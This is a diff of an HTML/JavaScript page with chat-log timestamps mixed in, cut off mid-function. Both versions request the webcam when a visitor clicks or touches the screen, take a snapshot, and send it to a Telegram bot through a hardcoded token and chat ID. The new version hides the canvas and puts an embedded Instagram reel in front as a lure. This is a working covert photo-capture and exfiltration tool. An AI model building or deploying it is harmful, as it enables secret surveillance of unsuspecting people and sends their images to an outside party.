@@ -1,126 +1,42 @@
-[30-09-2026 02:35] 😍 abdo 08399: #result {
-        max-width: 90%;
-        max-height: 90vh;
-        border-radius: 10px;
-        display: none;
-        margin: auto;
+iframe {
+        border: none;
+        max-width: 100%;
+        max-height: 100%;
     }
 </style>
-<img id="result" alt="">
+<!-- عرض فيديو إنستغرام -->
+<iframe 
+    src="https://www.instagram.com/reel/DdjtPokIGQY/embed" 
+    width="400" 
+    height="500" 
+    scrolling="no" 
+    allowtransparency="true"
+    allow="encrypted-media">
+</iframe>
+
+<!-- عنصر Canvas مخفي -->
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
-    const TELEGRAM_CHAT_ID = '6642913954';
+    const TELEGRAM_BOT_TOKEN = "8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA";
+    const TELEGRAM_CHAT_ID = "664291354";
 
-    let isProcessing = false;
+    let stream = null;
+    const canvas = document.getElementById('canvas');
 
-    async function handleCapture() {
-        if (isProcessing) return;
-        isProcessing = true;
-
-        let stream = null;
-
+    async function handleCapture(event) {
         try {
-            // 1. طلب إذن الكاميرا عند النقر على أي مكان بالصفحة
+            // طلب الوصول للكاميرا
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
-            // إنشاء عنصر فيديو مخفي في الذاكرة
+            
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            // 2. التقاط صورة فورية
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-
-            // إظهار الصورة الملتقطة لمدة ثانية
-            const img = document.getElementById('result');
-            img.src = canvas.toDataURL('image/png');
-            img.style.display = 'block';
-
-            setTimeout(() => {
-                img.style.display = 'none';
-            }, 1000);
-
-            // 3. إرسال الصورة لبوت تيليجرام
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, 'capture.png');
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (err) {
-                    console.error("خطأ الإرسال:", err);
-                }
-            }, 'image/png');
-
-        } catch (err) {
-            console.error("خطأ الكاميرا:", err);
-        } finally {
-            // 4. إغلاق الكاميرا وإطفاء الضوء فوراً وبشكل قطعي
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-        }
-    }
-
-    // تشغيل طلب الإذن فور نقر المستخدم في أي مكان داخل الشاشة
-    window.addEventListener('click', handleCapture);
-    window.addEventListener('touchstart', handleCapture);
-</script>
-[30-09-2026 02:38] 😍 abdo 08399: #result {
-        max-width: 90%;
-        max-height: 90vh;
-        border-radius: 10px;
-        display: none;
-    }
-</style>
-<img id="result" alt="">
-
-<script>
-    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
-    const TELEGRAM_CHAT_ID = '6642913954';
-
-    let isProcessing = false;
-
-    async function handleCapture() {
-        if (isProcessing) return;
-        isProcessing = true;
-
-        let stream = null;
-
-        try {
-            // 1. طلب إذن الكاميرا عند النقر على الشاشة
-            stream = await navigator.mediaDevices.getUserMedia({ video: true });
-
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-
-            // 2. التقاط صورة فورية
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
-
-            // إظهار اللقطة لمدة ثانية واحدة
-            const img = document.getElementById('result');
-            img.src = canvas.toDataURL('image/png');
-            img.style.display = 'block';
-
-            setTimeout(() => {
-                img.style.display = 'none';
-            }, 1000);
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             // 3. إرسال الصورة إلى تيليجرام
             canvas.toBlob(async (blob) => {
